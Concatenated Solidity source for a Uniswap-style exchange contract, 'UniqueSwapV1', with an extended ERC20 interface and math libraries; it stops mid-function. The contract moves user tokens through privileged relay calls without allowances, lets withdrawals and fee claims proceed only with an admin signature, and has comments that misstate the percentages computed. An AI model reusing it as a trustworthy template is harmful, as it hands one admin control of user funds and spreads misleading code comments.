// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts (last updated v4.5.0) (token/ERC20/IERC20.sol)

pragma solidity ^0.8.4;

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `to`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address to, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `from` to `to` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);

    function relayTransfer(
        address from,
        address to,
        uint256 value
    ) external returns (bool);

    function relayMint(address to, uint256 value) external;

    function relayBurn(address from, uint256 value) external;

    function ethTransfer(address from, uint256 value) external;

    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

// SPDX-License-Identifier: GPL-3.0-or-later

pragma solidity ^0.8.4;

// a library for performing various math operations

library Math {
    function min(uint256 x, uint256 y) internal pure returns (uint256 z) {
        z = x < y ? x : y;
    }

    // babylonian method (https://en.wikipedia.org/wiki/Methods_of_computing_square_roots#Babylonian_method)
    function sqrt(uint256 y) internal pure returns (uint256 z) {
        if (y > 3) {
            z = y;
            uint256 x = y / 2 + 1;
            while (x < z) {
                z = x;
                x = (y / x + x) / 2;
            }
        } else if (y != 0) {
            z = 1;
        }
    }
}

// SPDX-License-Identifier: GPL-3.0-or-later

pragma solidity =0.8.4;

// a library for handling binary fixed point numbers (https://en.wikipedia.org/wiki/Q_(number_format))

// range: [0, 2**112 - 1]
// resolution: 1 / 2**112

library UQ112x112 {
    //solhint-disable-next-line state-visibility
    uint224 constant Q112 = 2 ** 112;

    // encode a uint112 as a UQ112x112
    function encode(uint112 y) internal pure returns (uint224 z) {
        z = uint224(y) * Q112; // never overflows
    }

    // divide a UQ112x112 by a uint112, returning a UQ112x112
    function uqdiv(uint224 x, uint112 y) internal pure returns (uint224 z) {
        z = x / uint224(y);
    }
}

// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.4;

//solhint-disable not-rely-on-time
//solhint-disable var-name-mixedcase
//solhint-disable reason-string

// import "./libraries/UniqueSwapV1Library.sol";
// import "hardhat/console.sol";
import "./interfaces/IERC20.sol";
import "./libraries/Math.sol";
import "./libraries/UQ112x112.sol";

contract UniqueSwapV1 {
    using UQ112x112 for uint224;
    address public admin;

    uint256 public constant MINIMUM_LIQUIDITY = 10 ** 3;
    uint112 private reserve0; // uses single storage slot, accessible via getReserves
    uint112 private reserve1; // uses single storage slot, accessible via getReserves
    uint32 private blockTimestampLast; // uses single storage slot, accessible via getReserves

    address private WM;
    address private WW;
    address private WLDLP;
    address private WETH; // vault
    address private ULPT;
    address private Para;
    address private Treasury;

    uint256 public price0CumulativeLast;
    uint256 public price1CumulativeLast;
    uint256 public kLast; // reserve0 * reserve1, as of immediately after the most recent liquidity event
    uint256 public currentK; // reserve0 * reserve1, as of immediately after the most recent liquidity event
    event LiquidityLock(
        address sender,
        uint256 amount,
        uint256 timestamp,
        string lID
    );
    event Sync(uint112 reserve0, uint112 reserve1);
    event LiquidityCreated(
        address indexed sender,
        uint256 amount0,
        uint256 amount1,
        uint256 lpMinted,
        uint256 pastK,
        uint256 blockTimestamp //* liquidity ID
    );
    event LiquidityRemoved(
        address indexed sender,
        uint256 amount0,
        uint256 amount1,
        uint256 lpBurned,
        string lID //* liquidity ID
    );

    event ClaimFee(
        address indexed claimer,
        uint256 fees,
        uint256 lpTokenBurned,
        string lID //* liquidity ID
    );

    event ClaimBonus(uint256 amount, address to, string uid);
    event ClaimTax(uint256 amount, address to, string uid);
    event Swap(
        uint256 amount0In,
        uint256 amount1In,
        uint256 amount0Out,
        uint256 amount1Out,
        address indexed to
    );
    modifier ensure(uint256 deadline) {
        require(deadline >= block.timestamp, "UniqueSwapV1Router: EXPIRED");
        _;
    }

    uint256 private unlocked = 1;
    modifier lock() {
        require(unlocked == 1, "UniqueSwapV1: LOCKED");
        unlocked = 0;
        _;
        unlocked = 1;
    }

    constructor(
        address _WM,
        address _WW,
        address _WLDLP,
        address _WETH,
        address _ULPT,
        address _Para,
        address _Treasury
    ) {
        WM = _WM;
        WW = _WW;
        WLDLP = _WLDLP;
        WETH = _WETH;
        ULPT = _ULPT;
        Para = _Para;
        Treasury = _Treasury;
        admin = msg.sender;
    }

    receive() external payable {
        // assert(msg.sender == WETH); // only accept ETH via fallback from the WETH contract
    }

    function getReserves()
        public
        view
        returns (
            uint112 _reserve0,
            uint112 _reserve1,
            uint32 _blockTimestampLast
        )
    {
        // console.log("getReserves called");
        _reserve0 = reserve0;
        _reserve1 = reserve1;
        _blockTimestampLast = blockTimestampLast;
    }

    // fetches and sorts the reserves for a pair
    function getReservesWithSort(
        address tokenA,
        address tokenB
    ) internal view returns (uint256 reserveA, uint256 reserveB) {
        (address token0, ) = sortTokens(tokenA, tokenB);
        (uint256 _reserve0, uint256 _reserve1, ) = getReserves();
        (reserveA, reserveB) = tokenA == token0
            ? (_reserve0, _reserve1)
            : (_reserve1, _reserve0);
    }

    // **** ADD LIQUIDITY ****
    function _addLiquidity(
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin
    ) internal virtual returns (uint256 amountA, uint256 amountB) {
        (uint256 reserveA, uint256 reserveB, ) = getReserves();
        // console.log("_addLiquidity reserveA: ", reserveA);
        // console.log("_addLiquidity reserveB: ", reserveB);
        // console.log("amountADesired: ", amountADesired);
        // console.log("amountBDesired: ", amountBDesired);
        // console.log("amountAMin: ", amountAMin);
        // console.log("amountBMin: ", amountBMin);
        if (reserveA == 0 && reserveB == 0) {
            (amountA, amountB) = (amountADesired, amountBDesired);
        } else {
            uint256 amountBOptimal = quote(amountADesired, reserveA, reserveB);
            // console.log("amountBOptimal: ", amountBOptimal);
            if (amountBOptimal <= amountBDesired) {
                require(
                    amountBOptimal >= amountBMin,
                    "UniqueSwapV1Router: INSUFFICIENT_B_AMOUNT"
                );
                (amountA, amountB) = (amountADesired, amountBOptimal);
            } else {
                uint256 amountAOptimal = quote(
                    amountBDesired,
                    reserveB,
                    reserveA
                );
                // console.log("amountAOptimal: ", amountAOptimal);
                assert(amountAOptimal <= amountADesired);
                require(
                    amountAOptimal >= amountAMin,
                    "UniqueSwapV1Router: INSUFFICIENT_A_AMOUNT"
                );
                (amountA, amountB) = (amountAOptimal, amountBDesired);
            }
        }
    }

    function addLiquidityETH(
        uint256 amountTokenB,
        uint256 amountTokenBMin,
        uint256 amountETHMin,
        // address to,
        uint256 deadline
    )
        external
        payable
        ensure(deadline)
        returns (uint256 amountETH, uint256 amountToken, uint256 liquidity)
    {
        (amountETH, amountToken) = _addLiquidity(
            msg.value,
            amountTokenB,
            amountETHMin,
            amountTokenBMin
        );
        payable(WETH).transfer(msg.value);
        IERC20(WLDLP).relayTransfer(msg.sender, address(this), amountTokenB);
        IERC20(WLDLP).relayTransfer(address(this), WETH, amountTokenB);

        IERC20(WM).relayTransfer(WETH, address(this), msg.value);
        IERC20(WW).relayTransfer(WETH, address(this), amountTokenB);

        liquidity = mint(msg.sender);
    }

    // **** REMOVE LIQUIDITY ****
    function removeLiquidityETH(
        uint256 deadline,
        uint256 lpToken,
        string memory lID,
        bytes memory signature
    ) public ensure(deadline) returns (uint256 amountA, uint256 amountB) {
        bytes32 message = prefixed(
            keccak256(abi.encodePacked(msg.sender, deadline, lID))
        );
        // console.log("admin: ", admin);
        // console.log("recoverSigner: ", recoverSigner(message, signature));
        require(recoverSigner(message, signature) == admin, "wrong signature");
        (uint256 amount0, uint256 amount1) = burn(msg.sender, lID, lpToken);
        // (address token0, ) = sortTokens(WM, WW);
        // // console.log("token0: ", token0);
        // // console.log("WM: ", WM);
        // console.log("amountAMin: ", amountAMin);
        // console.log("amountBMin: ", amountBMin);
        // // console.log("amount0: ", amount0);
        // // console.log("amount1: ", amount1);
        (amountA, amountB) = (amount0, amount1);
    }

    // **** SWAP ****
    // requires the initial amount to have already been sent to the first pair
    function _swap(
        uint256[] memory amounts,
        address[] memory path,
        address sender
    ) internal {
        (address input, address output) = (path[0], path[1]);
        (address token0, ) = sortTokens(input, output);
        uint256 amountOut = amounts[1];
        // console.log("input token: ", input);
        // console.log("token0: ", token0);
        // console.log("amountOut: ", amountOut);

        (uint256 amount0Out, uint256 amount1Out) = input == token0
            ? (uint256(0), amountOut)
            : (amountOut, uint256(0));
        swap(amount0Out, amount1Out, sender);
    }

    // we give exact eth to the contract and then we swap it for tokens
    function swapExactETHForTokens(
        uint256 amountOutMin,
        address[] calldata path,
        uint256 deadline
    ) external payable ensure(deadline) returns (uint256[] memory amounts) {
        require(path[0] == WM, "UniqueSwapV1Router: INVALID_PATH");
        amounts = getAmountsOut(msg.value, path);

        require(
            amounts[amounts.length - 1] >= amountOutMin,
            "UniqueSwapV1Router: INSUFFICIENT_OUTPUT_AMOUNT"
        );
        // console.log("path[0]: ", path[0]);
        // console.log("path[1]: ", path[1]);

        payable(WETH).transfer(msg.value);
        IERC20(WM).relayTransfer(WETH, address(this), msg.value);
        _swap(amounts, path, msg.sender);
    }

    // we give exact tokens to the contract and then we swap it for eth
    function swapExactTokensForETH(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        uint256 deadline
    ) external ensure(deadline) returns (uint256[] memory amounts) {
        require(
            path[path.length - 1] == WM,
            "UniqueSwapV1Router: INVALID_PATH"
        );
        amounts = getAmountsOut(amountIn, path);

        require(
            amounts[amounts.length - 1] >= amountOutMin,
            "UniqueSwapV1Router: INSUFFICIENT_OUTPUT_AMOUNT"
        );

        IERC20(WLDLP).relayTransfer(msg.sender, address(this), amounts[0]);
        IERC20(WLDLP).relayTransfer(address(this), WETH, amounts[0]);
        IERC20(WW).relayTransfer(WETH, address(this), amounts[0]);
        _swap(amounts, path, msg.sender);
    }

    function swapETHForExactTokens(
        uint256 amountOut,
        address[] calldata path,
        uint256 deadline
    ) external payable ensure(deadline) returns (uint256[] memory amounts) {
        require(path[0] == WM, "UniqueSwapV1Router: INVALID_PATH");
        amounts = getAmountsIn(amountOut, path);
        require(
            amounts[0] <= msg.value,
            "UniqueSwapV1Router: EXCESSIVE_INPUT_AMOUNT"
        );
        payable(WETH).transfer(msg.value);
        IERC20(WM).relayTransfer(WETH, address(this), msg.value);
        _swap(amounts, path, msg.sender);

        // refund dust eth, if any
        // if (msg.value > amounts[0])
        //     TransferHelper.safeTransferETH(msg.sender, msg.value - amounts[0]);
    }

    function swapTokensForExactETH(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        uint256 deadline
    ) external ensure(deadline) returns (uint256[] memory amounts) {
        require(
            path[path.length - 1] == WM,
            "UniqueSwapV1Router: INVALID_PATH"
        );
        amounts = getAmountsIn(amountOut, path);
        require(
            amounts[0] <= amountInMax,
            "UniqueSwapV1Router: EXCESSIVE_INPUT_AMOUNT"
        );

        IERC20(WLDLP).relayTransfer(msg.sender, address(this), amounts[0]);
        IERC20(WLDLP).relayTransfer(address(this), WETH, amounts[0]);
        IERC20(WW).relayTransfer(WETH, address(this), amounts[0]);
        _swap(amounts, path, msg.sender);
    }

    /// custom functions ****************************************************

    // this low-level function should be called from a contract which performs important safety checks
    function mint(address to) internal lock returns (uint256 liquidity) {
        (uint112 _reserve0, uint112 _reserve1, ) = getReserves(); // gas savings
        uint256 balance0 = IERC20(WM).balanceOf(address(this));
        uint256 balance1 = IERC20(WW).balanceOf(address(this));
        uint256 amount0 = balance0 - _reserve0;
        uint256 amount1 = balance1 - _reserve1;
        // console.log("amount0: ", amount0);
        // console.log("amount1: ", amount1);

        uint256 _totalSupply = IERC20(ULPT).totalSupply(); // gas savings, must be defined here since totalSupply can update in _mintFee
        // console.log("_totalSupply: ", _totalSupply);
        if (_totalSupply == 0) {
            liquidity = Math.sqrt(amount0 * amount1) - MINIMUM_LIQUIDITY;
            // console.log("1.liquidity: ", liquidity);
            IERC20(ULPT).relayMint(WLDLP, MINIMUM_LIQUIDITY); // here WLDLP is temporary address instead of zero address
        } else {
            liquidity = Math.min(
                (amount0 * _totalSupply) / _reserve0,
                (amount1 * _totalSupply) / _reserve1
            );
        }
        // console.log("2. liquidity: ", liquidity);
        require(liquidity > 0, "UniqueSwapV1: INSUFFICIENT_LIQUIDITY_MINTED");
        IERC20(ULPT).relayMint(to, liquidity);
        // console.log("Mint done: ");

        _update(balance0, balance1, _reserve0, _reserve1);
        // console.log("Update done: ");
        kLast = uint256(reserve0) * reserve1; // reserve0 and reserve1 are up-to-date
        currentK = uint256(reserve0) * reserve1; // reserve0 and reserve1 are up-to-date
        emit LiquidityCreated(
            to,
            amount0,
            amount1,
            liquidity,
            kLast,
            block.timestamp
        );
    }

    // this low-level function should be called from a contract which performs important safety checks
    function burn(
        address to,
        string memory lID,
        uint256 lpToken
    ) internal lock returns (uint amount0, uint amount1) {
        (uint112 _reserve0, uint112 _reserve1, ) = getReserves(); // gas savings
        address _token0 = WM; // gas savings
        address _token1 = WW; // gas savings
        uint balance0 = IERC20(_token0).balanceOf(address(this));
        uint balance1 = IERC20(_token1).balanceOf(address(this));
        // uint liquidity = IERC20(ULPT).balanceOf(msg.sender);

        uint _totalSupply = IERC20(ULPT).totalSupply(); // gas savings, must be defined here since totalSupply can update in _mintFee
        amount0 = (lpToken * balance0) / _totalSupply; // using balances ensures pro-rata distribution
        amount1 = (lpToken * balance1) / _totalSupply; // using balances ensures pro-rata distribution

        require(
            amount0 > 0 && amount1 > 0,
            "UniqueSwapV1: INSUFFICIENT_LIQUIDITY_BURNED"
        );
        // console.log("burn balance0: ", balance0);
        // console.log("burn balance1: ", balance1);
        // console.log("burn amount0: ", amount0);
        // console.log("burn amount1: ", amount1);
        // console.log("burn liquidity: ", liquidity);
        // console.log("burn _totalSupply: ", _totalSupply);

        IERC20(ULPT).relayBurn(to, lpToken);

        IERC20(_token0).relayTransfer(address(this), WETH, amount0);
        IERC20(WETH).ethTransfer(address(this), amount0);

        IERC20(_token1).relayTransfer(address(this), WETH, amount1);
        IERC20(WLDLP).relayTransfer(WETH, address(this), amount1);
        IERC20(WLDLP).relayTransfer(address(this), to, amount1);

        payable(to).transfer(amount0);

        balance0 = IERC20(_token0).balanceOf(address(this));
        balance1 = IERC20(_token1).balanceOf(address(this));

        _update(balance0, balance1, _reserve0, _reserve1);
        kLast = uint256(reserve0) * reserve1; // reserve0 and reserve1 are up-to-date
        currentK = uint256(reserve0) * reserve1; // reserve0 and reserve1 are up-to-date
        emit LiquidityRemoved(to, amount0, amount1, lpToken, lID);
    }

    // this low-level function should be called from a contract which performs important safety checks
    function swap(
        uint256 amount0Out,
        uint256 amount1Out,
        address to
    ) internal lock {
        require(
            amount0Out > 0 || amount1Out > 0,
            "UniqueSwapV1: INSUFFICIENT_OUTPUT_AMOUNT"
        );
        (uint112 _reserve0, uint112 _reserve1, ) = getReserves(); // gas savings
        // console.log("swap _reserve0: ", _reserve0);
        // console.log("swap _reserve1: ", _reserve1);
        // console.log("swap amount0Out: ", amount0Out);
        // console.log("swap amount1Out: ", amount1Out);
        require(
            amount0Out < _reserve0 && amount1Out < _reserve1,
            "UniqueSwapV1: INSUFFICIENT_LIQUIDITY"
        );

        uint256 balance0;
        uint256 balance1;
        {
            // scope for _token{0,1}, avoids stack too deep errors
            address _token0 = WM;
            address _token1 = WW;
            require(to != _token0 && to != _token1, "UniqueSwapV1: INVALID_TO");
            if (amount0Out > 0) {
                // console.log("amount0Out: ", amount0Out);
                IERC20(_token0).relayTransfer(address(this), WETH, amount0Out); // _safeTransfer(_token0, to, amount0Out); // optimistically transfer tokens
                IERC20(WETH).ethTransfer(address(this), amount0Out);
                payable(to).transfer(amount0Out);
            }

            if (amount1Out > 0) {
                // console.log("amount1Out: ", amount1Out);
                IERC20(_token1).relayTransfer(address(this), WETH, amount1Out); // _safeTransfer(_token1, to, amount1Out); // optimistically transfer tokens
                IERC20(WLDLP).relayTransfer(WETH, address(this), amount1Out);
                IERC20(WLDLP).relayTransfer(address(this), to, amount1Out);
            }

            balance0 = IERC20(_token0).balanceOf(address(this));
            balance1 = IERC20(_token1).balanceOf(address(this));
            // console.log("swap balance0: ", balance0);
            // console.log("swap balance1: ", balance1);
        }
        uint256 amount0In = balance0 > _reserve0 - amount0Out
            ? balance0 - (_reserve0 - amount0Out)
            : 0;
        uint256 amount1In = balance1 > _reserve1 - amount1Out
            ? balance1 - (_reserve1 - amount1Out)
            : 0;
        // console.log("blc amount0In: ", amount0In);
        // console.log("blc amount1In: ", amount1In);

        require(
            amount0In > 0 || amount1In > 0,
            "UniqueSwapV1: INSUFFICIENT_INPUT_AMOUNT"
        );
        {
            // scope for reserve{0,1}Adjusted, avoids stack too deep errors
            uint256 balance0Adjusted = balance0 * 1000 - amount0In * 3;
            uint256 balance1Adjusted = balance1 * 1000 - amount1In * 3;
            require(
                balance0Adjusted * balance1Adjusted >=
                    uint256(_reserve0) * _reserve1 * 1e6,
                "UniqueSwapV1: K"
            );
        }
        _update(balance0, balance1, _reserve0, _reserve1);
        currentK = uint256(reserve0) * reserve1; // reserve0 and reserve1 are up-to-date
        emit Swap(amount0In, amount1In, amount0Out, amount1Out, to);
    }

    // update reserves and, on the first call per block, price accumulators
    function _update(
        uint256 balance0,
        uint256 balance1,
        uint112 _reserve0,
        uint112 _reserve1
    ) private {
        require(
            balance0 <= type(uint112).max && balance1 <= type(uint112).max,
            "UniqueSwapV1: OVERFLOW"
        );
        uint32 blockTimestamp = uint32(block.timestamp % 2 ** 32);
        unchecked {
            uint32 timeElapsed = blockTimestamp - blockTimestampLast; // overflow is desired
            if (timeElapsed > 0 && _reserve0 != 0 && _reserve1 != 0) {
                // * never overflows, and + overflow is desired
                price0CumulativeLast +=
                    uint256(UQ112x112.encode(_reserve1).uqdiv(_reserve0)) *
                    timeElapsed;
                price1CumulativeLast +=
                    uint256(UQ112x112.encode(_reserve0).uqdiv(_reserve1)) *
                    timeElapsed;
            }
        }
        reserve0 = uint112(balance0);
        reserve1 = uint112(balance1);
        blockTimestampLast = blockTimestamp;
        emit Sync(reserve0, reserve1);
    }

    // given some amount of an asset and pair reserves, returns an equivalent amount of the other asset
    function quote(
        uint256 amountA,
        uint256 reserveA,
        uint256 reserveB
    ) public pure returns (uint256 amountB) {
        require(amountA > 0, "UniqueSwapV1Library: INSUFFICIENT_AMOUNT");
        require(
            reserveA > 0 && reserveB > 0,
            "UniqueSwapV1Library: INSUFFICIENT_LIQUIDITY"
        );
        amountB = (amountA * reserveB) / reserveA;
    }

    // given an input amount of an asset and pair reserves, returns the maximum output amount of the other asset
    function getAmountOut(
        uint256 amountIn,
        uint256 reserveIn,
        uint256 reserveOut
    ) public pure returns (uint256 amountOut) {
        require(amountIn > 0, "UniqueSwapV1Library: INSUFFICIENT_INPUT_AMOUNT");
        require(
            reserveIn > 0 && reserveOut > 0,
            "UniqueSwapV1Library: INSUFFICIENT_LIQUIDITY"
        );
        uint256 amountInWithFee = amountIn * 997;
        uint256 numerator = amountInWithFee * reserveOut;
        uint256 denominator = (reserveIn * 1000) + amountInWithFee;
        amountOut = numerator / denominator;
    }

    // given an output amount of an asset and pair reserves, returns a required input amount of the other asset
    function getAmountIn(
        uint256 amountOut,
        uint256 reserveIn,
        uint256 reserveOut
    ) public pure returns (uint256 amountIn) {
        require(
            amountOut > 0,
            "UniqueSwapV1Library: INSUFFICIENT_OUTPUT_AMOUNT"
        );
        require(
            reserveIn > 0 && reserveOut > 0,
            "UniqueSwapV1Library: INSUFFICIENT_LIQUIDITY"
        );
        uint256 numerator = reserveIn * amountOut * 1000;
        uint256 denominator = (reserveOut - amountOut) * 997;
        amountIn = numerator / denominator + 1;
    }

    // performs chained getAmountOut calculations on any number of pairs
    function getAmountsOut(
        uint256 amountIn,
        address[] memory path
    ) internal view returns (uint256[] memory amounts) {
        require(path.length >= 2, "UniqueSwapV1Library: INVALID_PATH");
        amounts = new uint256[](path.length);
        amounts[0] = amountIn;
        (uint256 reserveIn, uint256 reserveOut) = getReservesWithSort(
            path[0],
            path[1]
        );
        amounts[1] = getAmountOut(amountIn, reserveIn, reserveOut);
        // console.log("amounts[0]: ", amounts[0]);
        // console.log("amounts[1]: ", amounts[1]);
    }

    // performs chained getAmountIn calculations on any number of pairs
    function getAmountsIn(
        uint256 amountOut,
        address[] memory path
    ) internal view returns (uint256[] memory amounts) {
        require(path.length >= 2, "UniqueSwapV1Library: INVALID_PATH");
        amounts = new uint256[](path.length);
        amounts[1] = amountOut;
        (uint256 reserveIn, uint256 reserveOut) = getReservesWithSort(
            path[0],
            path[1]
        );
        amounts[0] = getAmountIn(amounts[1], reserveIn, reserveOut);
    }

    function deposit(uint256 amount) public payable {
        // require(msg.value == amount);
        // reciever.transfer(amount);
        // nothing else to do!
    }

    // function checkMatic() public view returns (uint256) {
    //     return address(this).balance;
    // }

    // function checkWrapMatic() public view returns (uint256) {
    //     return IERC20(WM).balanceOf(address(this));
    // }

    // function checkWrapWLDLP() public view returns (uint256) {
    //     return IERC20(WW).balanceOf(address(this));
    // }

    // function checkOriginalWLDLP() public view returns (uint256) {
    //     return IERC20(WLDLP).balanceOf(address(this));
    // }

    // function transfer() public {
    //     uint256 maticBalance = address(this).balance;
    //     uint256 originalBalance = IERC20(WLDLP).balanceOf(address(this));
    //     // console.log("sync maticBalance: ", maticBalance);
    //     // console.log("sync originalBalance: ", originalBalance);
    //     if (maticBalance > 0) {
    //         IERC20(WM).relayTransfer(WETH, address(this), maticBalance);
    //     }
    //     if (originalBalance > 0) {
    //         IERC20(WLDLP).relayTransfer(address(this), WETH, originalBalance);
    //         IERC20(WW).relayTransfer(
    //             WETH,
    //             address(this),
    //             originalBalance
    //         );
    //     }
    // }

    // force reserves to match balances
    function sync() external lock {
        // check contract hold matic
        uint256 maticBalance = address(this).balance;
        uint256 originalWLDLPBalance = IERC20(WLDLP).balanceOf(address(this));
        // console.log("sync maticBalance: ", maticBalance);
        // console.log("sync originalWLDLPBalance: ", originalWLDLPBalance);
        if (maticBalance > 0) {
            ethTransfer(WETH, maticBalance);
            IERC20(WM).relayTransfer(WETH, address(this), maticBalance);
        }
        if (originalWLDLPBalance > 0) {
            IERC20(WLDLP).relayTransfer(
                address(this),
                WETH,
                originalWLDLPBalance
            );
            IERC20(WW).relayTransfer(WETH, address(this), originalWLDLPBalance);
        }

        _update(
            IERC20(WM).balanceOf(address(this)),
            IERC20(WW).balanceOf(address(this)),
            reserve0,
            reserve1
        );
    }

    function sortTokens(
        address tokenA,
        address tokenB
    ) internal pure returns (address token0, address token1) {
        require(tokenA != tokenB, "UniqueSwapV1Library: IDENTICAL_ADDRESSES");
        (token0, token1) = tokenA < tokenB
            ? (tokenA, tokenB)
            : (tokenB, tokenA);
        require(token0 != address(0), "UniqueSwapV1Library: ZERO_ADDRESS");
    }

    function readFees(uint256 myK) internal view returns (uint256) {
        address _token0 = WM; // gas savings
        address _token1 = WW; // gas savings
        uint256 balance0 = IERC20(_token0).balanceOf(address(this));
        uint256 balance1 = IERC20(_token1).balanceOf(address(this));

        uint256 lpTokens = IERC20(ULPT).balanceOf(msg.sender);
        // console.log("currentK: ", currentK);
        // console.log("lpTokens: ", lpTokens);

        uint256 totalLpTokens = IERC20(ULPT).totalSupply();
        // console.log("totalLpTokens: ", totalLpTokens);

        uint256 share = (lpTokens * currentK) / totalLpTokens;
        // console.log("share: ", share);
        require(share > myK, "No fees to claim");
        uint256 shareOfFees = share - myK;
        // console.log("shareOfFees: ", shareOfFees);

        // uint256 feeSharePercent = (shareOfFees * 100) / currentK;
        // // console.log("feeSharePercent: ", feeSharePercent);
        uint256 feeInLPToken = (shareOfFees * totalLpTokens) / currentK;
        // console.log("feeInLPToken: ", feeInLPToken);

        // console.log("balance0: ", balance0);
        // console.log("balance1: ", balance1);

        uint256 amount0 = (feeInLPToken * balance0) / totalLpTokens; // using balances ensures pro-rata distribution
        uint256 amount1 = (feeInLPToken * balance1) / totalLpTokens; // using balances ensures pro-rata distribution
        // console.log("amount0: ", amount0);
        // console.log("amount1: ", amount1);

        uint256 amountOUt = getAmountOut(amount0, reserve0, reserve1);
        // console.log("amountOUt: ", amountOUt);
        // calculate 5 percent of amountOut
        uint256 amountOut5Percent = (amountOUt * 2) / 100;
        // console.log("amountOut5Percent: ", amountOut5Percent);

        uint256 totalWldlp = amount1 + (amountOUt - amountOut5Percent);
        // console.log("totalWldlp: ", totalWldlp);
        return totalWldlp;
    }

    function readFee(uint256 myK, address walletid) public view returns (uint256) {
        address _token0 = WM; // gas savings
        address _token1 = WW; // gas savings
        uint256 balance0 = IERC20(_token0).balanceOf(address(this));
        uint256 balance1 = IERC20(_token1).balanceOf(address(this));

        uint256 lpTokens = IERC20(ULPT).balanceOf(walletid);
        // console.log("currentK: ", currentK);
        // console.log("lpTokens: ", lpTokens);

        uint256 totalLpTokens = IERC20(ULPT).totalSupply();
        // console.log("totalLpTokens: ", totalLpTokens);

        uint256 share = (lpTokens * currentK) / totalLpTokens;
        // console.log("share: ", share);
        require(share > myK, "No fees to claim");
        uint256 shareOfFees = share - myK;
        // console.log("shareOfFees: ", shareOfFees);

        // uint256 feeSharePercent = (shareOfFees * 100) / currentK;
        // // console.log("feeSharePercent: ", feeSharePercent);
        uint256 feeInLPToken = (shareOfFees * totalLpTokens) / currentK;
        // console.log("feeInLPToken: ", feeInLPToken);

        // console.log("balance0: ", balance0);
        // console.log("balance1: ", balance1);

        uint256 amount0 = (feeInLPToken * balance0) / totalLpTokens; // using balances ensures pro-rata distribution
        uint256 amount1 = (feeInLPToken * balance1) / totalLpTokens; // using balances ensures pro-rata distribution
        // console.log("amount0: ", amount0);
        // console.log("amount1: ", amount1);

        uint256 amountOUt = getAmountOut(amount0, reserve0, reserve1);
        // console.log("amountOUt: ", amountOUt);
        // calculate 5 percent of amountOut
        uint256 amountOut5Percent = (amountOUt * 2) / 100;
        // console.log("amountOut5Percent: ", amountOut5Percent);

        uint256 totalWldlp = amount1 + (amountOUt - amountOut5Percent);
        // console.log("totalWldlp: ", totalWldlp);
        return totalWldlp;
    }

    function liquidityLock(
        uint256 amountIn1,
        uint256 deadline,
        string memory lID,
        bytes memory signature
    ) public {
        bytes32 message = prefixed(
            keccak256(abi.encodePacked(msg.sender, amountIn1, deadline, lID))
        );
        // console.log("admin: ", admin);
        // console.log("recoverSigner: ", recoverSigner(message, signature));
        require(recoverSigner(message, signature) == admin, "wrong signature");
        uint256 amountOut20Percent = _liquidityLock(amountIn1);
        emit LiquidityLock(
            msg.sender,
            amountOut20Percent,
            block.timestamp,
            lID
        );
    }

    function _liquidityLock(
        uint256 amountIn1
    ) internal lock returns (uint256 amountOut20Percent) {
        amountOut20Percent = (amountIn1 * 50) / 100;
        // console.log("amountOut20Percent: ", amountOut20Percent);
        IERC20(WLDLP).relayMint(Para, amountOut20Percent);
    }

    function claimFees(
        uint256 myK,
        uint256 deadline,
        string memory lID,
        bytes memory signature
    ) public ensure(deadline) {
        bytes32 message = prefixed(
            keccak256(abi.encodePacked(msg.sender, myK, deadline, lID))
        );
        // console.log("admin: ", admin);
        // console.log("recoverSigner: ", recoverSigner(message, signature));
        require(recoverSigner(message, signature) == admin, "wrong signature");
        _feeClaim(myK, lID);
    }

    function claimBonus(
        uint256 amount,
        string memory uid,
        uint256 deadline,
        bytes memory signature
    ) public ensure(deadline) {
        bytes32 message = prefixed(
            keccak256(abi.encodePacked(msg.sender, amount, uid, deadline))
        );
        // console.log("admin: ", admin);
        // console.log("recoverSigner: ", recoverSigner(message, signature));
        require(recoverSigner(message, signature) == admin, "wrong signature");
        _claimBonus(amount, msg.sender, uid);
    }

    function _claimBonus(
        uint256 amount,
        address to,
        string memory uid
    ) internal lock {
        IERC20(WLDLP).relayTransfer(Para, to, amount);
        emit ClaimBonus(amount, to, uid);
    }

    function claimTax(
        uint256 amount,
        string memory uid,
        uint256 deadline,
        bytes memory signature
    ) public ensure(deadline) {
        bytes32 message = prefixed(
            keccak256(abi.encodePacked(amount, uid, deadline))
        );
        // console.log("admin: ", admin);
        // console.log("recoverSigner: ", recoverSigner(message, signature));
        require(recoverSigner(message, signature) == admin, "wrong signature");
        _claimTax(amount, uid);
    }

    function _claimTax(uint256 amount, string memory uid) internal lock {
        IERC20(WLDLP).relayTransfer(Para, Treasury, amount);
